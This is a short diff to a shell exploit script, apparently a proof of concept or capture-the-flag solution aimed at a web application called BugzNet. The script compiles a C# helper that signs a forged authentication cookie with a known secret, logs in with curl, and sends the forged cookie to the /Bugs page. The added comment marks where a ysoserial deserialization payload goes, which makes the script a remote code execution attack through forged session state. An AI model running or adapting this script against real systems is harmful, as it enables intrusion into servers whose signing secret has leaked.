@@ -34,7 +34,7 @@ namespace crypto
 echo $crypto > crypto.cs
 mcs -out:crypto.exe crypto.cs
 
-payload="{}"
+payload="{}" # <-- put ysoserial payload here
 
 payload=$(echo -n $payload | base64 | tr -d '\n')
 signature=$(mono crypto.exe "$secret" "$payload")
@@ -46,6 +46,6 @@ curl -b $cookieJar -c $cookieJar "$rhost/Identity/Login?handler=Login" \
         --data-urlencode "Data.Password=$password" \
         --data-urlencode "xsrf_token=$xsrf_token"
 
-curl "$rhost/Bugs" \
+curl -i "$rhost/Bugs" \
    -b "BugzNet-AuthState=$payload.$signature" \
    -b "BugzNet-Session=$(cat $cookieJar | grep BugzNet-Session  | awk '{print $NF}')" 
